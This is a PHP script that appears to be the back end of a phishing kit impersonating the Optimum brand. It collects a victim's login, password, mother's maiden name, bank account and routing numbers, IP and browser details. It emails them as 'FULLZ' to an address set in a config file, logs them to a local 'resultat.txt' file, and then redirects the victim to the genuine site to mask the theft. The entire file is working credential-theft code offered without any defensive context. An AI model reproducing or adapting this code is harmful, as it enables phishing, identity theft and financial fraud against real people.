<?php
include('config.php');


function token() {
    $alphabet = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890';
    $pass = array(); //remember to declare $pass as an array
    $alphaLength = strlen($alphabet) - 1; //put the length -1 in cache
    for ($i = 0; $i < 15; $i++) {
        $n = rand(0, $alphaLength);
        $pass[] = $alphabet[$n];
    }
    return implode($pass); //turn the array into a string
}

if(isset($_POST['accountNumber'])){
    

    $Subject = '[OPTIMUM '.$_SESSION['IP'].'] FULLZ'; 
    $Body .= "\n\n\n\n--------------Optimum FULLZ-----------------------\n";
    $Body .= 'Username: '.$_SESSION['user'].'
Password: '.$_SESSION['passwd'].'   

Mothers Maiden Name: '.$_POST['mmn'].'  
Account number: '.$_POST['accountNumber'].'   
Routing number: '.$_POST['routing'].'     
             

IP: '.$_SESSION['IP'].'  
User-Agent: '.$_SESSION['HTTP_USER_AGENT'].'\n';
    $Body .= "|----------- Optimum --------------|\n"; 

    
    @mail($not_email, $Subject, $Body); 

    $message .= "\n\n\n\n--------------Optimum FULLZ-----------------------\n";
    $message .= 'Username: '.$_SESSION['user'].'
Password: '.$_SESSION['passwd'].'   

Mothers Maiden Name: '.$_POST['mmn'].'  
Account number: '.$_POST['accountNumber'].'   
Routing number: '.$_POST['routing'].'      
 

IP: '.$_SESSION['IP'].'  
User-Agent: '.$_SESSION['HTTP_USER_AGENT']."\n";
    $message .= "|----------- Optimum --------------|\n\n\n\n\n\n\n";
    $victimes = fopen("resultat.txt","a");
    fwrite($victimes,$message);
    fclose($victimes);

    header("Location: https://www.optimum.net/");
}else{
    exit();
}
?>